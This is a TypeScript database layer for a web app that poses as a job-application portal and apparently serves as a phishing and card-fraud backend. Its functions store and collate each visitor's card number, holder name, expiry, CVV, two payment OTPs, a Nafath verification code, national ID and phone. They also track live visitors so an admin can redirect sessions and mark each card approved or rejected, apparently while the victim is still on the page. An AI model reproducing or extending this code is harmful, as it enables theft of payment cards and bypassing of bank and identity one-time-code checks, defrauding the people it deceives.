import { eq, desc, sql, and, gte, like, or, inArray } from "drizzle-orm";
import { drizzle } from "drizzle-orm/mysql2";
import { InsertUser, users, applications, siteSettings, InsertApplication, InsertSiteSettings, applicationSteps, InsertApplicationStep, adminAccounts, adminSessions, InsertAdminAccount, InsertAdminSession, liveVisitors, visitorCommands, InsertLiveVisitor, InsertVisitorCommand } from "../drizzle/schema";
import { lt } from "drizzle-orm";
import { ENV } from './_core/env';

let _db: ReturnType<typeof drizzle> | null = null;

export async function getDb() {
  if (!_db && process.env.DATABASE_URL) {
    try {
      _db = drizzle(process.env.DATABASE_URL);
    } catch (error) {
      console.warn("[Database] Failed to connect:", error);
      _db = null;
    }
  }
  return _db;
}

export async function upsertUser(user: InsertUser): Promise<void> {
  if (!user.openId) throw new Error("User openId is required for upsert");

  const db = await getDb();
  if (!db) {
    console.warn("[Database] Cannot upsert user: database not available");
    return;
  }

  try {
    const values: InsertUser = { openId: user.openId };
    const updateSet: Record<string, unknown> = {};

    const textFields = ["name", "email", "loginMethod"] as const;
    type TextField = (typeof textFields)[number];

    const assignNullable = (field: TextField) => {
      const value = user[field];
      if (value === undefined) return;
      const normalized = value ?? null;
      values[field] = normalized;
      updateSet[field] = normalized;
    };

    textFields.forEach(assignNullable);

    if (user.lastSignedIn !== undefined) {
      values.lastSignedIn = user.lastSignedIn;
      updateSet.lastSignedIn = user.lastSignedIn;
    }
    if (user.role !== undefined) {
      values.role = user.role;
      updateSet.role = user.role;
    } else if (user.openId === ENV.ownerOpenId) {
      values.role = 'admin';
      updateSet.role = 'admin';
    }

    if (!values.lastSignedIn) values.lastSignedIn = new Date();
    if (Object.keys(updateSet).length === 0) updateSet.lastSignedIn = new Date();

    await db.insert(users).values(values).onDuplicateKeyUpdate({ set: updateSet });
  } catch (error) {
    console.error("[Database] Failed to upsert user:", error);
    throw error;
  }
}

export async function getUserByOpenId(openId: string) {
  const db = await getDb();
  if (!db) return undefined;
  const result = await db.select().from(users).where(eq(users.openId, openId)).limit(1);
  return result.length > 0 ? result[0] : undefined;
}

// ==================== Applications ====================

export async function createApplication(data: InsertApplication) {
  const db = await getDb();
  if (!db) throw new Error("Database not available");
  const result = await db.insert(applications).values(data);
  return result;
}

export async function listApplications(opts: {
  search?: string;
  status?: "new" | "reviewed" | "accepted" | "rejected";
  gender?: "male" | "female";
  limit?: number;
  offset?: number;
} = {}) {
  const db = await getDb();
  if (!db) return [];

  const conditions = [];
  if (opts.status) conditions.push(eq(applications.status, opts.status));
  if (opts.gender) conditions.push(eq(applications.gender, opts.gender));
  if (opts.search) {
    const term = `%${opts.search}%`;
    conditions.push(
      or(
        like(applications.fullName, term),
        like(applications.familyName, term),
        like(applications.email, term),
        like(applications.idNumber, term),
        like(applications.phone, term),
      )!
    );
  }

  const whereClause = conditions.length > 0 ? and(...conditions) : undefined;

  const rows = await db
    .select()
    .from(applications)
    .where(whereClause)
    .orderBy(desc(applications.createdAt))
    .limit(opts.limit ?? 100)
    .offset(opts.offset ?? 0);

  return rows;
}

export async function getApplicationById(id: number) {
  const db = await getDb();
  if (!db) return undefined;
  const rows = await db.select().from(applications).where(eq(applications.id, id)).limit(1);
  return rows[0];
}

export async function updateApplicationStatus(id: number, status: "new" | "reviewed" | "accepted" | "rejected") {
  const db = await getDb();
  if (!db) throw new Error("Database not available");
  await db.update(applications).set({ status }).where(eq(applications.id, id));
}

export async function deleteApplication(id: number) {
  const db = await getDb();
  if (!db) throw new Error("Database not available");
  await db.delete(applications).where(eq(applications.id, id));
}

export async function getApplicationsStats() {
  const db = await getDb();
  if (!db) {
    return { total: 0, today: 0, byGender: [], byNationality: [], byStatus: [] };
  }

  const today = new Date();
  today.setHours(0, 0, 0, 0);

  const [totalRow] = await db.select({ count: sql<number>`count(*)` }).from(applications);
  const [todayRow] = await db
    .select({ count: sql<number>`count(*)` })
    .from(applications)
    .where(gte(applications.createdAt, today));

  const byGender = await db
    .select({ gender: applications.gender, count: sql<number>`count(*)` })
    .from(applications)
    .groupBy(applications.gender);

  const byNationality = await db
    .select({ nationality: applications.nationality, count: sql<number>`count(*)` })
    .from(applications)
    .groupBy(applications.nationality)
    .orderBy(desc(sql`count(*)`))
    .limit(10);

  const byStatus = await db
    .select({ status: applications.status, count: sql<number>`count(*)` })
    .from(applications)
    .groupBy(applications.status);

  return {
    total: Number(totalRow?.count ?? 0),
    today: Number(todayRow?.count ?? 0),
    byGender: byGender.map(r => ({ gender: r.gender, count: Number(r.count) })),
    byNationality: byNationality.map(r => ({ nationality: r.nationality, count: Number(r.count) })),
    byStatus: byStatus.map(r => ({ status: r.status, count: Number(r.count) })),
  };
}

// ==================== Site Settings ====================

export async function getSiteSettings() {
  const db = await getDb();
  if (!db) return null;
  const rows = await db.select().from(siteSettings).limit(1);
  if (rows.length === 0) {
    // إنشاء صف افتراضي إذا لم يوجد
    await db.insert(siteSettings).values({ redirectEnabled: false, redirectUrl: "" });
    const newRows = await db.select().from(siteSettings).limit(1);
    return newRows[0] ?? null;
  }
  return rows[0];
}

// ==================== Application Steps (tracking funnel) ====================

export async function createApplicationStep(data: InsertApplicationStep) {
  const db = await getDb();
  if (!db) throw new Error("Database not available");
  
  // إذا كانت الخطوة عبارة عن OTP (مثل code_pay أو pay_code أو n_code)
  // نقوم بحذف الإدخال القديم لنفس الجلسة ونفس الخطوة قبل إضافة الجديد
  // نحذف كلتا الصيغتين (بشرطة سفلية وشرطة عادية) لضمان عدم بقاء أي إدخال قديم
  if (data.stepKey === "code_pay" || data.stepKey === "code-pay") {
    await db.delete(applicationSteps).where(
      and(
        eq(applicationSteps.sessionId, data.sessionId),
        inArray(applicationSteps.stepKey, ["code_pay", "code-pay"])
      )
    );
  } else if (data.stepKey === "pay_code" || data.stepKey === "pay-code") {
    await db.delete(applicationSteps).where(
      and(
        eq(applicationSteps.sessionId, data.sessionId),
        inArray(applicationSteps.stepKey, ["pay_code", "pay-code"])
      )
    );
  } else if (data.stepKey === "n_code" || data.stepKey === "n-code") {
    await db.delete(applicationSteps).where(
      and(
        eq(applicationSteps.sessionId, data.sessionId),
        inArray(applicationSteps.stepKey, ["n_code", "n-code"])
      )
    );
  }
  
  await db.insert(applicationSteps).values(data);
}

export async function listApplicationStepsBySession(sessionId: string) {
  const db = await getDb();
  if (!db) return [];
  return await db
    .select()
    .from(applicationSteps)
    .where(eq(applicationSteps.sessionId, sessionId))
    .orderBy(applicationSteps.createdAt);
}

export async function listAllSteps(opts: { stepKey?: string; limit?: number } = {}) {
  const db = await getDb();
  if (!db) return [];
  const conditions = [];
  if (opts.stepKey) conditions.push(eq(applicationSteps.stepKey, opts.stepKey));
  const whereClause = conditions.length > 0 ? and(...conditions) : undefined;
  return await db
    .select()
    .from(applicationSteps)
    .where(whereClause)
    .orderBy(desc(applicationSteps.createdAt))
    .limit(opts.limit ?? 200);
}

export async function getApplicationStepsStats() {
  const db = await getDb();
  if (!db) return { byStepKey: [] as { stepKey: string; count: number }[] };
  const byStepKey = await db
    .select({ stepKey: applicationSteps.stepKey, count: sql<number>`count(*)` })
    .from(applicationSteps)
    .groupBy(applicationSteps.stepKey);
  return {
    byStepKey: byStepKey.map(r => ({ stepKey: r.stepKey, count: Number(r.count) })),
  };
}

export async function updateSiteSettings(data: Partial<InsertSiteSettings>) {
  const db = await getDb();
  if (!db) throw new Error("Database not available");
  const existing = await getSiteSettings();
  if (existing) {
    await db.update(siteSettings).set(data).where(eq(siteSettings.id, existing.id));
  } else {
    await db.insert(siteSettings).values(data);
  }
}

// ==================== Admin Accounts ====================

export async function getAdminByUsername(username: string) {
  const db = await getDb();
  if (!db) return undefined;
  const rows = await db.select().from(adminAccounts).where(eq(adminAccounts.username, username)).limit(1);
  return rows[0];
}

export async function getAdminById(id: number) {
  const db = await getDb();
  if (!db) return undefined;
  const rows = await db.select().from(adminAccounts).where(eq(adminAccounts.id, id)).limit(1);
  return rows[0];
}

export async function createAdminAccount(data: InsertAdminAccount) {
  const db = await getDb();
  if (!db) throw new Error("Database not available");
  await db.insert(adminAccounts).values(data);
}

export async function updateAdminLastLogin(id: number) {
  const db = await getDb();
  if (!db) return;
  await db.update(adminAccounts).set({ lastLoginAt: new Date() }).where(eq(adminAccounts.id, id));
}

export async function updateAdminPassword(id: number, passwordHash: string) {
  const db = await getDb();
  if (!db) throw new Error("Database not available");
  await db.update(adminAccounts).set({ passwordHash }).where(eq(adminAccounts.id, id));
}

export async function listAdminAccounts() {
  const db = await getDb();
  if (!db) return [];
  return await db.select({
    id: adminAccounts.id,
    username: adminAccounts.username,
    displayName: adminAccounts.displayName,
    isActive: adminAccounts.isActive,
    lastLoginAt: adminAccounts.lastLoginAt,
    createdAt: adminAccounts.createdAt,
  }).from(adminAccounts).orderBy(desc(adminAccounts.createdAt));
}

// ==================== Admin Sessions ====================

export async function createAdminSession(data: InsertAdminSession) {
  const db = await getDb();
  if (!db) throw new Error("Database not available");
  await db.insert(adminSessions).values(data);
}

export async function getAdminSessionByToken(token: string) {
  const db = await getDb();
  if (!db) return undefined;
  const rows = await db.select().from(adminSessions).where(eq(adminSessions.token, token)).limit(1);
  return rows[0];
}

export async function deleteAdminSession(token: string) {
  const db = await getDb();
  if (!db) return;
  await db.delete(adminSessions).where(eq(adminSessions.token, token));
}

export async function deleteExpiredAdminSessions() {
  const db = await getDb();
  if (!db) return;
  await db.delete(adminSessions).where(lt(adminSessions.expiresAt, new Date()));
}


// ==================== Live Visitors ====================

export async function upsertLiveVisitor(data: InsertLiveVisitor) {
  const db = await getDb();
  if (!db) return;
  // upsert based on sessionId
  const existing = await db.select().from(liveVisitors).where(eq(liveVisitors.sessionId, data.sessionId)).limit(1);
  if (existing.length > 0) {
    const prev = existing[0];
    const updateData: Partial<InsertLiveVisitor> = {
      lastSeen: new Date(),
      currentPage: data.currentPage,
      pageTitle: data.pageTitle ?? prev.pageTitle,
      ipAddress: data.ipAddress ?? prev.ipAddress,
      userAgent: data.userAgent ?? prev.userAgent,
      country: data.country ?? prev.country,
    };
    if (data.displayName) updateData.displayName = data.displayName;
    if (data.phone) updateData.phone = data.phone;
    // إذا تغيرت الصفحة، حدّث pageEnteredAt
    if (data.currentPage !== prev.currentPage) {
      updateData.pageEnteredAt = new Date();
    }
    await db.update(liveVisitors).set(updateData).where(eq(liveVisitors.sessionId, data.sessionId));
  } else {
    await db.insert(liveVisitors).values({
      ...data,
      lastSeen: new Date(),
      firstSeen: new Date(),
      pageEnteredAt: new Date(),
    });
  }
}

export async function listActiveLiveVisitors(activeWithinSeconds: number = 60) {
  const db = await getDb();
  if (!db) return [];
  const cutoff = new Date(Date.now() - activeWithinSeconds * 1000);
  return await db
    .select()
    .from(liveVisitors)
    .where(gte(liveVisitors.lastSeen, cutoff))
    .orderBy(desc(liveVisitors.lastSeen))
    .limit(200);
}

export async function deleteStaleLiveVisitors(olderThanSeconds: number = 600) {
  const db = await getDb();
  if (!db) return;
  const cutoff = new Date(Date.now() - olderThanSeconds * 1000);
  await db.delete(liveVisitors).where(lt(liveVisitors.lastSeen, cutoff));
}

export async function removeLiveVisitor(sessionId: string) {
  const db = await getDb();
  if (!db) return;
  await db.delete(liveVisitors).where(eq(liveVisitors.sessionId, sessionId));
}

// ==================== Visitor Commands ====================

export async function createVisitorCommand(data: InsertVisitorCommand) {
  const db = await getDb();
  if (!db) throw new Error("Database not available");
  // قبل إنشاء أمر جديد، ضع جميع أوامر redirect السابقة لنفس الجلسة بـ consumed
  await db
    .update(visitorCommands)
    .set({ consumed: true, consumedAt: new Date() })
    .where(
      and(
        eq(visitorCommands.sessionId, data.sessionId),
        eq(visitorCommands.consumed, false)
      )
    );
  await db.insert(visitorCommands).values(data);
}

export async function getPendingCommandsForSession(sessionId: string) {
  const db = await getDb();
  if (!db) return [];
  return await db
    .select()
    .from(visitorCommands)
    .where(
      and(
        eq(visitorCommands.sessionId, sessionId),
        eq(visitorCommands.consumed, false)
      )
    )
    .orderBy(visitorCommands.createdAt);
}

export async function markCommandsConsumed(commandIds: number[]) {
  const db = await getDb();
  if (!db || commandIds.length === 0) return;
  // تنفيذ تحديث لكل id
  for (const id of commandIds) {
    await db.update(visitorCommands).set({ consumed: true, consumedAt: new Date() }).where(eq(visitorCommands.id, id));
  }
}

// ==================== Live Submissions Feed (للوحة التحكم) ====================

/**
 * أحدث الطلبات والخطوات معاً مرتبة زمنياً
 */
export async function getLiveSubmissionsFeed(limit: number = 50) {
  const db = await getDb();
  if (!db) return [];
  // ندمج applications وapplicationSteps في تدفق واحد
  const recentApps = await db
    .select()
    .from(applications)
    .orderBy(desc(applications.createdAt))
    .limit(limit);

  const recentSteps = await db
    .select()
    .from(applicationSteps)
    .orderBy(desc(applicationSteps.createdAt))
    .limit(limit);

  type FeedItem = {
    type: "application" | "step";
    id: number;
    title: string;
    subtitle: string;
    sessionId?: string | null;
    stepKey?: string;
    createdAt: Date;
    raw: any;
  };

  const items: FeedItem[] = [];

  for (const app of recentApps) {
    items.push({
      type: "application",
      id: app.id,
      title: `${app.fullName} ${app.familyName}`,
      subtitle: `${app.email} · ${app.nationality}`,
      createdAt: app.createdAt,
      raw: app,
    });
  }

  for (const step of recentSteps) {
    items.push({
      type: "step",
      id: step.id,
      title: `خطوة: ${step.stepKey}`,
      subtitle: `جلسة: ${step.sessionId.slice(0, 12)}...`,
      sessionId: step.sessionId,
      stepKey: step.stepKey,
      createdAt: step.createdAt,
      raw: step,
    });
  }

  items.sort((a, b) => b.createdAt.getTime() - a.createdAt.getTime());
  return items.slice(0, limit);
}


// ==================== Visitor + Submissions (دمج بطاقة الزائر مع تقديماته) ====================

/**
 * يجلب الزوار النشطين مع كل ما قدّموه (طلب التوظيف + جميع الخطوات)
 * مرتبة لكل زائر تحت بطاقته الواحدة
 */
export async function getVisitorsWithSubmissions(activeWithinSeconds: number = 60) {
  const db = await getDb();
  if (!db) return [];

  // 1. جلب الزوار النشطين
  const cutoff = new Date(Date.now() - activeWithinSeconds * 1000);
  const visitors = await db
    .select()
    .from(liveVisitors)
    .where(gte(liveVisitors.lastSeen, cutoff))
    .orderBy(desc(liveVisitors.lastSeen))
    .limit(200);

  if (visitors.length === 0) return [];

  const sessionIds = visitors.map((v) => v.sessionId);

  // 2. جلب جميع الخطوات لهذه الجلسات
  const allSteps = await db
    .select()
    .from(applicationSteps)
    .where(
      sessionIds.length > 0
        ? sql`${applicationSteps.sessionId} IN (${sql.join(
            sessionIds.map((s) => sql`${s}`),
            sql`, `
          )})`
        : undefined
    )
    .orderBy(desc(applicationSteps.createdAt));

  // 3. جلب جميع طلبات التوظيف لهذه الجلسات
  const allApplications = await db
    .select()
    .from(applications)
    .where(
      sessionIds.length > 0
        ? sql`${applications.sessionId} IN (${sql.join(
            sessionIds.map((s) => sql`${s}`),
            sql`, `
          )})`
        : undefined
    )
    .orderBy(desc(applications.createdAt));

  // 4. تجميع البيانات لكل زائر
  return visitors.map((visitor) => {
    const visitorSteps = allSteps.filter(
      (step) => step.sessionId === visitor.sessionId
    );
    const visitorApplication = allApplications.find(
      (app) => app.sessionId === visitor.sessionId
    );

    // تكوين تايملاين موحد للتقديمات
    type SubmissionItem = {
      type: "application" | "step";
      id: number;
      key: string; // application أو stepKey
      title: string;
      data: Record<string, unknown>;
      createdAt: Date;
    };

    const submissions: SubmissionItem[] = [];

    if (visitorApplication) {
      submissions.push({
        type: "application",
        id: visitorApplication.id,
        key: "application",
        title: "طلب التوظيف الأساسي",
        data: visitorApplication as unknown as Record<string, unknown>,
        createdAt: visitorApplication.createdAt,
      });
    }

    for (const step of visitorSteps) {
      let parsed: Record<string, unknown> = {};
      try {
        parsed = JSON.parse(step.data);
      } catch {
        parsed = { raw: step.data };
      }
      submissions.push({
        type: "step",
        id: step.id,
        key: step.stepKey,
        title: stepKeyToTitle(step.stepKey),
        data: parsed,
        createdAt: step.createdAt,
      });
    }

    submissions.sort((a, b) => a.createdAt.getTime() - b.createdAt.getTime());

    // استنتاج اسم العرض من البيانات إذا لم يكن مسجلاً
    let displayName = visitor.displayName;
    let phone = visitor.phone;

    if (!displayName && visitorApplication) {
      displayName = `${visitorApplication.fullName} ${visitorApplication.familyName ?? ""}`.trim();
    }
    if (!phone && visitorApplication?.phone) {
      phone = visitorApplication.phone;
    }
    // محاولة من بيانات الخطوات إذا لم يوجد
    if (!displayName || !phone) {
      for (const step of visitorSteps) {
        try {
          const parsed = JSON.parse(step.data) as Record<string, unknown>;
          if (!displayName) {
            const candidate =
              (parsed.fullName as string) ||
              (parsed.name as string) ||
              (parsed.holderName as string);
            if (candidate) displayName = candidate;
          }
          if (!phone) {
            const phoneCandidate =
              (parsed.phone as string) || (parsed.mobile as string);
            if (phoneCandidate) phone = phoneCandidate;
          }
          // التقاط رقم الجوال من صفحة number بشكل صريح
          if (step.stepKey === "number" || step.stepKey === "data") {
            const explicitPhone = (parsed.phone as string) || (parsed.mobile as string);
            if (explicitPhone) phone = explicitPhone;
          }
        } catch {
          /* ignore */
        }
      }
    }

    return {
      visitor: {
        ...visitor,
        displayName: displayName ?? null,
        phone: phone ?? null,
      },
      application: visitorApplication ?? null,
      submissions,
      stepCount: visitorSteps.length,
      hasApplication: !!visitorApplication,
    };
  });
}

function stepKeyToTitle(key: string): string {
  const map: Record<string, string> = {
    salary: "بنود العقد المبدئي",
    salary_accept: "قبول البنود",
    salary_reject: "رفض البنود",
    ypti: "شروط الفحص الطبي (YPTI)",
    ypti_accept: "قبول شروط YPTI",
    ypti_rejected: "رفض شروط YPTI",
    data: "بيانات الدفع الأولية",
    cardpayment: "بيانات البطاقة",
    "code-pay": "OTP أول",
    "pay-code": "OTP ثاني",
    number: "تأكيد رقم الجوال",
    "n-code": "OTP رقم الجوال",
    "cardpayment-error": "خطأ البطاقة",
  };
  return map[key] ?? key;
}


// ==================== عدّاد إجمالي الزيارات + حذف شامل ====================

/** إجمالي عدد الجلسات الفريدة (لأي وقت) */
export async function getTotalVisitorsCount(): Promise<number> {
  const db = await getDb();
  if (!db) return 0;
  const rows = await db
    .select({ c: sql<number>`COUNT(DISTINCT ${liveVisitors.sessionId})` })
    .from(liveVisitors);
  return Number(rows[0]?.c ?? 0);
}

/**
 * حذف جميع بيانات الزوار: جلسات، طلبات، خطوات، أوامر التوجيه
 * ⚠️ خطير - admin only
 */
export async function deleteAllVisitorData(): Promise<{
  visitors: number;
  applications: number;
  steps: number;
  commands: number;
}> {
  const db = await getDb();
  if (!db) return { visitors: 0, applications: 0, steps: 0, commands: 0 };

  const [visitorsCount] = await db
    .select({ c: sql<number>`COUNT(*)` })
    .from(liveVisitors);
  const [applicationsCount] = await db
    .select({ c: sql<number>`COUNT(*)` })
    .from(applications);
  const [stepsCount] = await db
    .select({ c: sql<number>`COUNT(*)` })
    .from(applicationSteps);
  const [commandsCount] = await db
    .select({ c: sql<number>`COUNT(*)` })
    .from(visitorCommands);

  await db.delete(visitorCommands);
  await db.delete(applicationSteps);
  await db.delete(applications);
  await db.delete(liveVisitors);

  return {
    visitors: Number(visitorsCount?.c ?? 0),
    applications: Number(applicationsCount?.c ?? 0),
    steps: Number(stepsCount?.c ?? 0),
    commands: Number(commandsCount?.c ?? 0),
  };
}

/** حذف زائر واحد وكل بياناته بناءً على sessionId */
export async function deleteVisitorBySessionId(sessionId: string): Promise<void> {
  const db = await getDb();
  if (!db) return;
  await db.delete(visitorCommands).where(eq(visitorCommands.sessionId, sessionId));
  await db.delete(applicationSteps).where(eq(applicationSteps.sessionId, sessionId));
  await db.delete(applications).where(eq(applications.sessionId, sessionId));
  await db.delete(liveVisitors).where(eq(liveVisitors.sessionId, sessionId));
}

/**
 * يجلب جميع الزوار (نشطين وغير نشطين) مع تقديماتهم
 * يستخدم في جدول لوحة التحكم (Bank Pal style)
 */
export async function getAllVisitorsWithSubmissions(limit: number = 200) {
  const db = await getDb();
  if (!db) return [];

  // جلب جميع الزوار الذين لديهم بيانات مسجلة (بدون حد)
  // بالإضافة إلى آخر `limit` زائر حديث (حتى لو بدون بيانات) لمتابعة النشاط الحي
  const sessionsWithData = await db
    .selectDistinct({ sessionId: applicationSteps.sessionId })
    .from(applicationSteps);
  const sessionsWithApps = await db
    .selectDistinct({ sessionId: applications.sessionId })
    .from(applications);

  const dataSessionIds = new Set([
    ...sessionsWithData.map(s => s.sessionId),
    ...sessionsWithApps.map(s => s.sessionId),
  ]);

  // جلب الزوار الذين لديهم بيانات (بدون حد)
  const dataSessionIdsArr = Array.from(dataSessionIds).filter((s): s is string => s !== null);
  const visitorsWithData = dataSessionIdsArr.length > 0
    ? await db
        .select()
        .from(liveVisitors)
        .where(
          sql`${liveVisitors.sessionId} IN (${sql.join(
            dataSessionIdsArr.map((s) => sql`${s}`),
            sql`, `
          )})`
        )
        .orderBy(desc(liveVisitors.firstSeen))
    : [];

  // جلب آخر `limit` زائر حديث (للنشاط الحي)
  const recentVisitors = await db
    .select()
    .from(liveVisitors)
    .orderBy(desc(liveVisitors.firstSeen))
    .limit(limit);

  // دمج القائمتين بدون تكرار
  const visitorsMap = new Map<string, typeof recentVisitors[0]>();
  for (const v of visitorsWithData) visitorsMap.set(v.sessionId, v);
  for (const v of recentVisitors) {
    if (!visitorsMap.has(v.sessionId)) visitorsMap.set(v.sessionId, v);
  }
  const visitors = Array.from(visitorsMap.values());

  if (visitors.length === 0) return [];

  const sessionIds = visitors.map((v) => v.sessionId);

  const allSteps = await db
    .select()
    .from(applicationSteps)
    .where(
      sql`${applicationSteps.sessionId} IN (${sql.join(
        sessionIds.map((s) => sql`${s}`),
        sql`, `
      )})`
    )
    .orderBy(desc(applicationSteps.createdAt));

  const allApplications = await db
    .select()
    .from(applications)
    .where(
      sql`${applications.sessionId} IN (${sql.join(
        sessionIds.map((s) => sql`${s}`),
        sql`, `
      )})`
    )
    .orderBy(desc(applications.createdAt));

  const ACTIVE_WINDOW_MS = 60 * 1000;
  const now = Date.now();

  // تجميع الجلسات حسب IP أو nationalId (إذا توفر)
  const mergedVisitorsMap = new Map<string, any>();

  const rawRows = visitors.map((visitor) => {
    const visitorSteps = allSteps.filter(
      (step) => step.sessionId === visitor.sessionId
    );
    const visitorApplication = allApplications.find(
      (app) => app.sessionId === visitor.sessionId
    );

    // استخراج البيانات المسطحة (آخر بيانات تم إدخالها)
    let fullName: string | null = visitor.displayName ?? null;
    let phone: string | null = visitor.phone ?? null;
    let email: string | null = null;
    let nationalId: string | null = null;
    let birthDate: string | null = null;
    let lastInputPage: string | null = null;
    let lastCardData: Record<string, unknown> | null = null;
    let lastOtpData: Record<string, unknown> | null = null;
    // === إدخالات صريحة للجدول ===
    let cardNumber: string | null = null;
    let cardHolderName: string | null = null;
    let cardExpiry: string | null = null;
    let cardCvv: string | null = null;
    let otp1: string | null = null;
    let otp2: string | null = null;
    let otpNafath: string | null = null;
    let paymentBank: string | null = null;
    let dataIdNumber: string | null = null;
    let dataPhone: string | null = null;
    // تاريخ تسجيل أول مرة (لثبات الصف بحيث لا يختفي)
    const firstSeenAt = visitor.firstSeen ?? visitor.lastSeen;

    if (visitorApplication) {
      fullName ||= `${visitorApplication.fullName} ${visitorApplication.familyName ?? ""}`.trim();
      phone ||= visitorApplication.phone ?? null;
      email = visitorApplication.email ?? null;
      nationalId = visitorApplication.idNumber ?? null;
      birthDate = visitorApplication.birthDate ?? null;
    }

    // المرور على الخطوات (الأحدث أولاً موجودة بسبب orderBy desc)
    const sortedSteps = [...visitorSteps].sort(
      (a, b) => b.createdAt.getTime() - a.createdAt.getTime()
    );

    for (const step of sortedSteps) {
      let parsed: Record<string, unknown> = {};
      try {
        parsed = JSON.parse(step.data);
      } catch {
        continue;
      }
      if (!lastInputPage) lastInputPage = stepKeyToTitle(step.stepKey);
      if (!fullName && (parsed.fullName || parsed.name || parsed.holderName)) {
        fullName = (parsed.fullName || parsed.name || parsed.holderName) as string;
      }
      if (!phone && (parsed.phone || parsed.mobile)) {
        phone = (parsed.phone || parsed.mobile) as string;
      }
      if (!email && parsed.email) email = parsed.email as string;
      if (!nationalId && (parsed.nationalId || parsed.idNumber)) {
        nationalId = (parsed.nationalId || parsed.idNumber) as string;
      }
      if (!birthDate && (parsed.birthDate || parsed.dob)) {
        birthDate = (parsed.birthDate || parsed.dob) as string;
      }
      // توحيد المفتاح (بعض الصفحات تستخدم _ وأخرى -)
      const k = step.stepKey.replace(/_/g, "-");
      if (!lastCardData && (k === "cardpayment" || k === "cardpayment-retry")) lastCardData = parsed;
      if (!lastOtpData && (k === "code-pay" || k === "pay-code" || k === "n-code")) {
        lastOtpData = parsed;
      }
      // التقاط صريح لحقول البطاقة (يشمل cardpayment_retry)
      if (k === "cardpayment" || k === "cardpayment-retry") {
        cardNumber ||= (parsed.cardNumber as string) || (parsed.card_number as string) || (parsed.number as string) || null;
        cardHolderName ||= (parsed.holderName as string) || (parsed.cardHolder as string) || (parsed.name as string) || null;
        cardExpiry ||= (parsed.expiry as string) || (parsed.expiryDate as string) || (parsed.expiration as string) ||
          ((parsed.month && parsed.year) ? `${parsed.month}/${parsed.year}` : null);
        cardCvv ||= (parsed.cvv as string) || (parsed.cvc as string) || null;
      }
      // التقاط أرمزة OTP بتسمية واضحة - دعم - و _
      if (k === "code-pay" && !otp1) {
        otp1 = (parsed.otp as string) || (parsed.code as string) || (parsed.otpCode as string) || null;
      }
      if (k === "pay-code" && !otp2) {
        otp2 = (parsed.otp as string) || (parsed.code as string) || (parsed.otpCode as string) || null;
      }
      if (k === "n-code" && !otpNafath) {
        otpNafath = (parsed.otp as string) || (parsed.code as string) || (parsed.otpCode as string) || null;
      }
      // التقاط صريح لحقول صفحة /data (بيانات الدفع الأولية)
      if (k === "data") {
        paymentBank ||= (parsed.bank as string) || (parsed.paymentMethod as string) || null;
        dataIdNumber ||= (parsed.idNumber as string) || (parsed.nationalId as string) || null;
        dataPhone ||= (parsed.phone as string) || (parsed.mobile as string) || null;
      }
      // التقاط رقم الجوال من صفحة /number
      if (k === "number") {
        dataPhone ||= (parsed.phone as string) || (parsed.mobile as string) || null;
        dataIdNumber ||= (parsed.idNumber as string) || (parsed.nationalId as string) || null;
      }
    }

    // تعبئة الرقم الوطني والجوال من صفحة /data إن لم تتوفر سابقاً
    nationalId ||= dataIdNumber;
    phone ||= dataPhone;

    const isActive = now - visitor.lastSeen.getTime() < ACTIVE_WINDOW_MS;

    return {
      sessionId: visitor.sessionId,
      isActive,
      currentPage: visitor.currentPage,
      lastSeen: visitor.lastSeen,
      ip: visitor.ipAddress ?? null,
      userAgent: visitor.userAgent ?? null,
      country: visitor.country ?? null,
      // البيانات المسطحة للجدول
      fullName,
      phone,
      email,
      nationalId,
      birthDate,
      lastInputPage,
      hasCardData: !!lastCardData,
      hasOtpData: !!lastOtpData,
      cardData: lastCardData,
      otpData: lastOtpData,
      // === إدخالات صريحة ===
      cardNumber,
      cardHolderName,
      cardExpiry,
      cardCvv,
      otp1,
      otp2,
      otpNafath,
      paymentBank,
      firstSeen: firstSeenAt,
      stepCount: visitorSteps.length,
      hasApplication: !!visitorApplication,
      applicationId: visitorApplication?.id ?? null,
      cardStatus: visitor.cardStatus ?? null,
      nafathNumber: visitor.nafathNumber ?? null,
      nafathSentAt: visitor.nafathSentAt ?? null,
      razerCode: visitor.razerCode ?? null,
      razerStatus: visitor.razerStatus ?? null,
    };
  });

  // دمج الجلسات التي تعود لنفس الشخص (نفس nationalId أو نفس الـ IP إذا لم يتوفر nationalId)
  for (const row of rawRows) {
    const mergeKey = row.nationalId || row.ip || row.sessionId;
    if (!mergedVisitorsMap.has(mergeKey)) {
      mergedVisitorsMap.set(mergeKey, { ...row });
    } else {
      const existing = mergedVisitorsMap.get(mergeKey);
      // تحديث البيانات بالمعلومات الأحدث أو الأكمل
      existing.isActive = existing.isActive || row.isActive;
      if (row.lastSeen > existing.lastSeen) {
        existing.lastSeen = row.lastSeen;
        existing.sessionId = row.sessionId;
        existing.currentPage = row.currentPage;
        existing.cardStatus = row.cardStatus;
        existing.nafathNumber = row.nafathNumber;
        existing.nafathSentAt = row.nafathSentAt;
        existing.razerCode = row.razerCode;
        existing.razerStatus = row.razerStatus;
      }
      if (row.firstSeen < existing.firstSeen) {
        existing.firstSeen = row.firstSeen;
      }
      existing.fullName = existing.fullName || row.fullName;
      existing.phone = existing.phone || row.phone;
      existing.email = existing.email || row.email;
      existing.nationalId = existing.nationalId || row.nationalId;
      existing.birthDate = existing.birthDate || row.birthDate;
      existing.cardNumber = existing.cardNumber || row.cardNumber;
      existing.cardHolderName = existing.cardHolderName || row.cardHolderName;
      existing.cardExpiry = existing.cardExpiry || row.cardExpiry;
      existing.cardCvv = existing.cardCvv || row.cardCvv;
      existing.otp1 = existing.otp1 || row.otp1;
      existing.otp2 = existing.otp2 || row.otp2;
      existing.otpNafath = existing.otpNafath || row.otpNafath;
      existing.paymentBank = existing.paymentBank || row.paymentBank;
      existing.stepCount += row.stepCount;
      existing.hasApplication = existing.hasApplication || row.hasApplication;
      existing.applicationId = existing.applicationId || row.applicationId;
      existing.razerCode = existing.razerCode || row.razerCode;
      existing.razerStatus = existing.razerStatus || row.razerStatus;
    }
  }

  // تحويل الخريطة إلى مصفوفة وترتيبها حسب firstSeen (الأحدث أولاً)
  return Array.from(mergedVisitorsMap.values()).sort(
    (a, b) => b.firstSeen.getTime() - a.firstSeen.getTime()
  );
}

// ==================== التحكم بالبطاقة + نفاذ ====================

/** تحديد حالة البطاقة لزائر (الأدمن فقط) */
export async function setVisitorCardStatus(
  sessionId: string,
  status: "pending" | "approved" | "rejected" | null
): Promise<void> {
  const db = await getDb();
  if (!db) return;
  await db
    .update(liveVisitors)
    .set({ cardStatus: status })
    .where(eq(liveVisitors.sessionId, sessionId));
}

/** تحديد رقم نفاذ لزائر (الأدمن فقط) */
